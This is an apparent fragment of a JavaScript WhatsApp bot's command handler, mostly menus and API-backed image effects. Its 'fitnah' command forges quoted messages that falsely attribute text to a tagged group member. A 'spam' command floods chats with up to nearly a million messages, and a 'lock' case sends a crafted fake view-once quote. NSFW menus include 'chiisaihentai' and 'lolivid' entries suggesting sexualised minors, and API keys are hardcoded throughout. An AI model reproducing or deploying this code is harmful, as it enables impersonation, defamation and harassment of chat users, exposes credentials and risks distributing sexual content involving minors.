Flw: instagram.com/achyrr_wann/ `
wann.sendMessage(from, { contentText: `${menu}`, footerText: `🐣 Day : ${week} ${weton}\n🐥 Date : ${date}`,buttons: [{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: '🏷️ RENT A BOT' }, type: 1 },{ buttonId: noprefix ? "ownee" : "!"+"owner", buttonText: { displayText: 'OWNER BOT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')

break
case "botanon":



tutor2 = 



`*ANONYMOUS BOT BETA*







this is an anonymous chat feature, a random chat feature among bot users, this feature cannot be used in groups (only personal chat) to use the anonymous feature type !anonymous in the personal chat bot , later the bot will find friends for you like a telegram bot,\n-!start to start \n-!stop to stop looking for friends \n-!next to find other friends(skip)







*Warning* 



-polite



-no calls/vc bots 



-no spam bots/pause 5 seconds 



-not allowed to enter bots in any group (owner's permission) 



-Do not use adult features for children under 18 years old -use bots wisely 







*be a good user and obey the rules*` 



reply(tutor2)



break







case 'f':



case 'lock':



ikymemek = {



 "key": {



"fromMe": false,



participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})



 },



 "message": {



"viewOnceMessage": {



  "message": {



 "imageMessage": {



"url": "https://mmg.whatsapp.net/d/f/AjD3dQIM5hW3UkDfnnkice-eMcsMJJALEcgD9HnDGZEp.enc",



"mimetype": "image/jpeg",



"fileSha256": "aR3vWUsV9VZUiR+agYok8oM4UHiuhqEShMpQ6SgY9WM=",



"fileLength": "675",



"height": 41,



"width": 52,



"mediaKey": "6RDG8T+jOb0RfleWzLTclsaVn0EGRA/v78dnS+Y4S+o=",



"fileEncSha256": "idNxqNtCaHRxuN+AX0uakPrBuiyvx84IksPUYMYgs7Y=",



"directPath": "/v/t62.7118-24/13810909_985978368802545_7608967834334288292_n.enc?ccb=11-4&oh=359274a24041d97e91597ad1fb40e784&oe=61595B99",



"mediaKeyTimestamp": "1630826390",



"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkANAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAApgAAAAAAAAAAAf/EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AK//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8AT//Z",



"viewOnce": true



 }



  }



}



 },



 "messageTimestamp": "1630826389",



 "status": "SERVER_ACK",



 "mediaData": {



"localPath": "/data/user/0/com.gbwhatsapp/files/ViewOnce/IMG-20210905-WA0047.jpg"



 }



  }



  wann.sendMessage(from, { "degreesLatitude": '', "degreesLongitude": '', "jpegThumbnail": fakeimage}, MessageType.location, {quoted: ikymemek})



  break



  case 'kalender':



  reply(`🐣Day ${week} ${weton} 



🐥Date : ${date}`)



  break







  case 'textpro':



  if (!isRegistered) return reply(ind.only.daftarB)



 wibu = `



▹「 Text Pro Me 」



▹ ${prefix}blackpink text



▹ ${prefix}neon text



▹ ${prefix}greenneon text



▹ ${prefix}advanceglow text



▹ ${prefix}futureneon text



▹ ${prefix}sandwriting text



▹ ${prefix}sandsummer text



▹ ${prefix}sandengraved text



▹ ${prefix}metaldark text



▹ ${prefix}neonlight text



▹ ${prefix}holographic text



▹ ${prefix}text1917 text



▹ ${prefix}minion text



▹ ${prefix}deluxesilver text



▹ ${prefix}newyearcard text



▹ ${prefix}bloodfrosted text



▹ ${prefix}halloween text



▹ ${prefix}jokerlogo text



▹ ${prefix}fireworksparkle text



▹ ${prefix}natureleaves text



▹ ${prefix}bokeh text



▹ ${prefix}toxic text



▹ ${prefix}strawberry text



▹ ${prefix}box3d text



▹ ${prefix}roadwarning text



▹ ${prefix}breakwall text



▹ ${prefix}icecold text



▹ ${prefix}luxury text



▹ ${prefix}cloud text



▹ ${prefix}summersand text



▹ ${prefix}horrorblood text



▹ ${prefix}thunder text



▹ ${prefix}pornhub text1 text2



▹ ${prefix}glitch text1 text2



▹ ${prefix}avenger text1 text2



▹ ${prefix}space text1 text2



▹ ${prefix}ninjalogo text1 text2



▹ ${prefix}marvelstudio text1 text2



▹ ${prefix}lionlogo text1 text2



▹ ${prefix}wolflogo text1 text2



▹ ${prefix}steel3d text1 text2



▹ ${prefix}wallgravity text1 text2



 `



  sendButMessage(from, wibu, `created follow @achyrr_wann`, [



  {



 buttonId: noprefix ? "menu" : "!"+"menu",



 buttonText: {



displayText: `⬡ BACK TO MENU `,



 },



 type: 1,



  },]);



  break



  case 'fitnah':















  if (!isGroup) return reply('ONLY GRUP')  











 if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag&pesan&balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)



var gh = body.slice(8)



 mentioned = wan.message.extendedTextMessage.contextInfo.mentionedJid



 var replace = gh.split("|")[0];



 var target = gh.split("|")[1];



 var bot = gh.split("|")[2];



 wann.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})



 break



 case 'wibu2':



 case 'nsfwanime':



 if (!isRegistered) return reply(ind.only.daftarB)



wibu = `▹ MENU



▹ chiisaihentai



▹ trap



▹ blowjob



▹ yaoi



▹ ecchi



▹ hentai



▹ ahegao



▹ hololewd



▹ sideoppai



▹ animefeets



▹ animebooty



▹ animethighss



▹ hentaiparadise



▹ animearmpits



▹ hentaifemdom



▹ lewdanimegirls



▹ biganimetiddies



▹ animebellybutton



▹ hentai4everyone`



 sendButMessage(from, wibu, `created follow @achyrr_wann`, [



 {



buttonId: noprefix ? "menu" : "!"+"menu",



buttonText: {



  displayText: `⬡ BACK TO MENU `,



},



type: 1,



 },]);



 break;



 case 'randomimage':



 case 'randomimage':



 wibu = `



▹ MENU



▹ bj



▹ ero



▹ ppcp



▹ cum



▹ feet



▹ yuri



▹ trap



▹ lewd



▹ feed



▹ eron



▹ solo



▹ gasm



▹ poke



▹ anal



▹ holo



▹ tits



▹ kuni



▹ kiss



▹ erok



▹ smug



▹ baka



▹ solog



▹ feetg



▹ lewdk



▹ waifu



▹ pussy



▹ femdom



▹ cuddle



▹ hentai



▹ eroyuri



▹ cum_jpg



▹ blowjob



▹ erofeet



▹ holoero



▹ classic



▹ erokemo



▹ fox_girl



▹ futanari



▹ lewdkemo



▹ wallpaper



▹ pussy_jpg



▹ kemonomimi



▹ nsfw_avatar



▹ ngif



▹ nsfw_neko_gif



▹ random_hentai_gif`



 sendButMessage(from, wibu, `created follow @achyrr_wann`, [



 {



buttonId: noprefix ? "menu" : "!"+"menu",



buttonText: {



  displayText: `⬡ BACK TO MENU `,



},



type: 1,



 },]);



 break;







 case 'photoxy':



 case 'photooky':



 if (!isRegistered) return reply(ind.only.daftarB)



wibu = `







▹ MENU



▹ shadow text



▹ cup text



▹ cup1 text



▹ romance text



▹ smoke text



▹ burnpaper text



▹ lovemessage text



▹ undergrass text



▹ love text



▹ coffe text



▹ woodheart text



▹ woodenboard text



▹ summer3d text



▹ wolfmetal text



▹ nature3d text



▹ underwater text



▹ golderrose text



▹ summernature text



▹ letterleaves text



▹ glowingneon text



▹ fallleaves text



▹ flamming text



▹ harrypotter text



▹ carvedwood text



▹ tiktok text1 text2



▹ arcade8bit text1 text2



▹ battlefield4 text1 text2



▹ pubg text1 text2`



 sendButMessage(from, wibu, `created follow @achyrr_wann`, [



 {



buttonId: noprefix ? "menu" : "!"+"menu",



buttonText: {



  displayText: `⬡ BACK TO MENU `,



},



type: 1,



 },]);



 break;



 case 'simi':



 if (args.length < 1) return reply('Textnya mana um?')



  teks = body.slice(5)



					anu = await simih(teks) //fetchJson(`https://mhankbarbars.herokuapp.com/api/samisami?text=${teks}`, {method: 'get'})



					//if (anu.error) return reply('Simi ga tau kak')



					reply(anu)



					break 



					case 'simih':



					



					if (args.length < 1) return reply('Hmmmm')



  if (Number(args[0]) === 1) {



if (isSimi) return reply('Mode simi sudah aktif')



  samih.push(from)



fs.writeFileSync('./src/simi.json', JSON.stringify(samih))



reply('Sukses mengaktifkan mode simi di group ini ✔️')



 } else if (Number(args[0]) === 0) {



samih.splice(from, 1)



fs.writeFileSync('./src/simi.json', JSON.stringify(samih))



reply('Sukes menonaktifkan mode simi di group ini ✔️')



 } else {



reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')



 }



 break



 case 'darkjoke': 







 buff = await getBuffer(`http://lolhuman.herokuapp.com/api/meme/darkjoke?apikey=IkyChan`, {method: 'get'})



 buttons = [{buttonId: noprefix ? "infoig" : "!"+"infoig",buttonText:{displayText: ` ©WhatsApp bot`},type:1}]



 imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



 buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



 contentText:`©WhatsApp bot`,buttons,headerType:4}



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



 wann.relayWAMessage(prep)



 break



 case 'ephoto':



 case 'ephotomenu':



 if (!isRegistered) return reply(ind.only.daftarB)



wibu = `







▹「 Ephoto 360 」



▹ wetglass text



▹ multicolor3d text



▹ watercolor text



▹ luxurygold text



▹ galaxywallpaper text



▹ lighttext text



▹ beautifulflower text



▹ puppycute text



▹ royaltext text



▹ heartshaped text



▹ birthdaycake text



▹ galaxystyle text



▹ hologram3d text



▹ greenneon text



▹ glossychrome text



▹ greenbush text



▹ metallogo text



▹ noeltext text



▹ glittergold text



▹ textcake text



▹ starsnight text



▹ wooden3d text



▹ textbyname text



▹ writegalacy text



▹ galaxybat text



▹ snow3d text



▹ birthdayday text



▹ goldplaybutton text



▹ silverplaybutton text



▹ freefire text`



 sendButMessage(from, wibu, `created follow @achyrr_wann`, [



 {



buttonId: noprefix ? "menu" : "!"+"menu",



buttonText: {



  displayText: `⬡ BACK TO MENU `,



},



type: 1,



 },]);



 break;



 case 'randomvideo':



 if (!isRegistered) return reply(ind.only.daftarB)



wibu = `



「 Random Video 」







▹ ${prefix} lolivid



▹ ${prefix} asupan



▹ ${prefix} storyanime



▹ ${prefix} astetick



▹ ${prefix} videoanime



`



 sendButMessage(from, wibu, `created follow @achyrr_wann`, [



 {



buttonId: noprefix ? "menu" : "!"+"menu",



buttonText: {



  displayText: `⬡ BACK TO MENU `,



},



type: 1,



 },]);



 break;



 case 'wasted':



 var imgbb = require('imgbb-uploader')



 if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



owgi = await wann.downloadAndSaveMediaMessage(ger)



data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/wasted?url=${data.display_url}&apikey=`)



wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



 } else {



reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}wasted`)



 }



 break



 case 'tahta':



 buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/harta-tahta?text=${q}&apikey=IkyChan`)



 buttons = [{buttonId: `${prefix}infoig`,buttonText:{displayText: ` ©WhatsApp bot`},type:1}]



 imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



 buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



 contentText:`©WhatsApp bot`,buttons,headerType:4}



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



 wann.relayWAMessage(prep)



 break



 case 'quotesmaker':



 buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/quote-maker?text=${q}&apikey=IkyChan`)



 wann.sendMessage(from, buff, image, {thumbnail: Buffer.alloc(0), quoted: freply})



 case 'tinyurl':



 anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/tinyurl?url=${q}&apikey=IkyChan`)



 wann.sendMessage(from, `${anu.result}`, text, {quoted: freply})



 break



 case 'cuttly':



 anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cuttly?url=${q}&apikey=IkyChan`)



 wann.sendMessage(from, `• Hasil: ${anu.result.hasil}\n• Dibuat Pada: ${anu.result.create_at}`, text, {quoted: freply})



 break



 case 'shorturl':



 anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/shrturl?url=${q}&apikey=IkyChan`)



 wann.sendMessage(from, `${anu.result}`, text, {quoted: freply})



 break



 case 'imagemani':



 case 'imageefek':



 if (!isRegistered) return reply(ind.only.daftarB)



wibu = `



*IMAGE MANIPULATION*



 



▹ ${prefix}darkjoke



▹ ${prefix}meme



▹ ${prefix}joke



▹ ${prefix}wasted



▹ ${prefix}hitler



▹ ${prefix}wanted



▹ ${prefix}greyscale



▹ ${prefix}trash



▹ ${prefix}circle



▹ ${prefix}blur



▹ ${prefix}tinyurl



▹ ${prefix}cuttly



▹ ${prefix}affect



▹ ${prefix}picture`



 sendButMessage(from, wibu, `created follow @achyrr_wann`, [



 {



buttonId: noprefix ? "menu" : "!"+"menu",



buttonText: {



  displayText: `⬡ BACK TO MENU `,



},



type: 1,



 },]);



 break;







 case '18+':



 case 'porno':



 case '18':



 wibu = `



MENU INI BERISI FITUR 18+



SEBELUM MELANJUTKAN PASTIKAN ANDA BERUMUR 18+



 `



 sendButMessage(from, wibu, `created follow @achyrr_wann`, [



 {



buttonId: `${prefix}pornmenu`,



buttonText: {



  displayText: `⬡ LANJUTAN `,



},



type: 1,



 },]);



 break;

case 'infocovid':



   txtt =`Hai Kak ${pushname} Berikut adalah informasi Covid19`







 buttons = [{buttonId: noprefix ? "covidindo" : "!"+"covidindo",buttonText:{displayText: 'INFO COVID19 INDONESIA'},type:1},{buttonId:noprefix ? "covidglobal" : "!"+"covidglobal", buttonText:{displayText:'INFO COVID19 GLOBAL'},type:1}]



 buttonsMessage = {



contentText: `${txtt}`,



footerText: 'selalu taati 5M Oke>3 ',



buttons: buttons,



headerType: 1



 }



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{})



 wann.relayWAMessage(prep)



 break

            case 'covidindo'://case by Dony

           

            anu = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=IkyChan`)

            anu1 = anu.result

            ini_txt = `*KASUS COVID DI INDONESIA!*\n\n*POSITIF:* ${anu1.positif}\n`

            ini_txt += `*SEMBUH:* ${anu1.sembuh}\n`

            ini_txt += `*DIRAWAT:* ${anu1.dirawat}\n`

            ini_txt += `*MENINGGAL:* ${anu1.meninggal}`

            reply(ini_txt)

            break

            

            case 'covidglobal'://case by Daffa

            anu = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=IkyChan`)

            anu1 = anu.result

            ini_txt = `*KASUS COVID GLOBAL!*\n\n*POSITIF:* ${anu1.positif}\n`

            ini_txt += `*SEMBUH:* ${anu1.sembuh}\n`

            ini_txt += `*DIRAWAT:* ${anu1.dirawat}\n`

            ini_txt += `*MENINGGAL:* ${anu1.meninggal}`

            reply(ini_txt)

            break





// Random Text //



  ///// LOLHUMAN API



  case 'spam':



  if (!wan.key.fromMe) return reply('FITUR INI KHUSUS OWNER BOT')



if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)



 argsi = arg.split("|")



  if (!argsi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)



 if (Number(argsi[1]) >= 1000000) return reply('Kebanyakan!')



if (isNaN(argsi[1])) return reply(`harus berupa angka`)



  for (let i = 0; i < argsi[1]; i++){



wann.sendMessage(from, argsi[0], MessageType.text)



 }



 break















 case 'picture':



 var imgbb = require('imgbb-uploader')



 if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/picture?url=${data.display_url}&apikey=IkyChan`)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}picture`)



}



break







case 'affect':



var imgbb = require('imgbb-uploader')



if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/affect?url=${data.display_url}&apikey=IkyChan`)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}affect`)



}



break



case 'invert':



var imgbb = require('imgbb-uploader')



if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/invert?url=${data.display_url}&apikey=IkyChan`)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}invert`)



}



break



case 'firework':



var imgbb = require('imgbb-uploader')



if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/img/firework?url=${data.display_url}&apikey=IkyChan`)



  buff = await getBuffer(anu.result.url)



  wann.sendMessage(from, buff, video, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}firework`)



}



break



case 'sepia':



var imgbb = require('imgbb-uploader')



if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/sepia?url=${data.display_url}&apikey=IkyChan`)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}sepia`)



}



break



case 'blur':



var imgbb = require('imgbb-uploader')



if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/blur?url=${data.display_url}&level=20&apikey=IkyChan`)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}blur`)



}



break



case 'circle':



var imgbb = require('imgbb-uploader')



if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/circle?url=${data.display_url}&apikey=IkyChan`)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}circle`)



}



break



case 'trash':



var imgbb = require('imgbb-uploader')



if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/trash?url=${data.display_url}&apikey=IkyChan`)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}trash`)



}



break



case 'wiki':



anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/wiki?kata=${q}&apikey=IkyChan`)



wann.sendMessage(from, `「 RESULT FOUND 」\n• Hasil Pencarian Dari: ${anu.result.from}\n• Hasil: ${anu.hasil}`, text, {quoted: freply})



break



case 'wanted':



var imgbb = require('imgbb-uploader')



if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/wanted?url=${data.display_url}&apikey=IkyChan`)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}wanted`)



}



break



case 'joke':



var imgbb = require('imgbb-uploader')



if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



  ger = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  owgi = await wann.downloadAndSaveMediaMessage(ger)



  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)



  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/joke?url=${data.display_url}&apikey=IkyChan`)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})



} else {



  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}joke`)



}



break



case 'chiisaihentai':

case 'trap':

case 'blowjob':

case 'yaoi':

case 'ecchi':

case 'ahegao':

case 'hololewd':

case 'sideoppai':

case 'animefeets':

case 'animebooty':

case 'animethighss':

case 'hentaiparadise':

case 'animearmpits':

case 'hentaifemdom':

case 'lewdanimegirls':

case 'biganimetiddies':

case 'animebellybutton':

case 'hentai4everyone':

reply (mess.wait)

              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=IkyChan`)

              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]

              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'follow @bnyk_pnderr', imageMessage: imageMsg,

              contentText:`©DONZ BOT`,buttons,headerType:4}

              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

              wann.relayWAMessage(prep)

        

    

break

case 'bj':

case 'ero':

case 'cum':

case 'feet':

case 'yuri':

case 'trap':

case 'lewd':

case 'feed':

case 'eron':

case 'solo':

case 'gasm':

case 'poke':

case 'anal':

case 'holo':

case 'tits':

case 'kuni':

case 'kiss':

case 'erok':

case 'smug':

case 'baka':

case 'solog':

case 'feetg':

case 'lewdk':

case 'waifu':

case 'pussy':

case 'femdom':

case 'cuddle':

case 'hentai':

case 'eroyuri':

case 'cum_jpg':

case 'blowjob':

case 'erofeet':

case 'holoero':

case 'classic':

case 'erokemo':

case 'fox_girl':

case 'futanari':

case 'lewdkemo':

case 'wallpaper':

case 'pussy_jpg':

case 'kemonomimi':

case 'nsfw_avatar':

reply (mess.wait)

               buff = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=IkyChan`)

buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]

              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,

              contentText:`©WhatsApp bot`,buttons,headerType:4}

              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

              wann.relayWAMessage(prep)

        

    break











case 'ppcp':

case 'ppcouple':



anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=IkyChan`)

						buff1 = await getBuffer(anu.result.male)

						buttons = [{buttonId: `${prefix}infoig`,buttonText:{displayText: `©DONZ Bot`},type:1}]

              imageMsg = (await wann.prepareMessageMedia(buff1, "imageMessage", { thumbnail: buff1, })).imageMessage

              buttonsMessage = {footerText:'follow @bnyk_pnderr', imageMessage: imageMsg,

              contentText:`Cowo`,buttons,headerType:4}

              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

              wann.relayWAMessage(prep)

            buff2 = await getBuffer(anu.result.female)

              buttons = [{buttonId: `${prefix}infoig`,buttonText:{displayText: `©DONZ Bot`},type:1}]

              imageMsg = (await wann.prepareMessageMedia(buff2, "imageMessage", { thumbnail: buff2, })).imageMessage

              buttonsMessage = {footerText:'follow @bnyk_pnderr', imageMessage: imageMsg,

              contentText:`Cewe`,buttons,headerType:4}

              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

             setTimeout( async () => {

 wann.relayWAMessage(prep)

}, 5000)

break



case 'meme':



case 'memek':







buff = await getBuffer ('https://leyscoders-api.herokuapp.com/api/memeindo?apikey=IkyChan')







buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]



imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}



prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



wann.relayWAMessage(prep)







break



 // Textprome //



 case 'blackpink':



 case 'neon':



 case 'greenneon':



 case 'advanceglow':



 case 'futureneon':



 case 'sandwriting':



 case 'sandsummer':



 case 'sandengraved':



 case 'metaldark':



 case 'neonlight':



 case 'holographic':



 case 'text1917':



 case 'minion':



 case 'deluxesilver':



 case 'newyearcard':



 case 'bloodfrosted':



 case 'halloween':



 case 'jokerlogo':



 case 'fireworksparkle':



 case 'natureleaves':



 case 'bokeh':



 case 'toxic':



 case 'strawberry':



 case 'box3d':



 case 'roadwarning':



 case 'breakwall':



 case 'icecold':



 case 'luxury':



 case 'cloud':



 case 'summersand':



 case 'horrorblood':



 case 'thunder':



 reply (mess.wait)



 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)



ini_txt = args.join(" ")



 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=IkyChan&text=${ini_txt}`)



 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]



 imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



 buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



 contentText:`©WhatsApp bot`,buttons,headerType:4}



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



 wann.relayWAMessage(prep)







 break



 case 'pornhub':



 case 'glitch':



 case 'avenger':



 case 'space':



 case 'ninjalogo':



 case 'marvelstudio':



 case 'lionlogo':



 case 'wolflogo':



 case 'steel3d':



 case 'wallgravity':



 reply (mess.wait)



 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)



txt1 = args[0]



 txt2 = args[1]



 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=IkyChan&text1=${txt1}&text2=${txt2}`)



 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]



 imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



 buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



 contentText:`©WhatsApp bot`,buttons,headerType:4}



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



 wann.relayWAMessage(prep)







 break







 // Photo Oxy //



 case 'shadow':



 case 'cup':



 case 'cup1':



 case 'romance':



 case 'smoke':



 case 'burnpaper':



 case 'lovemessage':



 case 'undergrass':



 case 'love':



 case 'coffe':



 case 'woodheart':



 case 'woodenboard':



 case 'summer3d':



 case 'wolfmetal':



 case 'nature3d':



 case 'underwater':



 case 'golderrose':



 case 'summernature':



 case 'letterleaves':



 case 'glowingneon':



 case 'fallleaves':



 case 'flamming':



 case 'harrypotter':



 case 'carvedwood':



 reply (mess.wait)



 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)



ini_txt = args.join(" ")



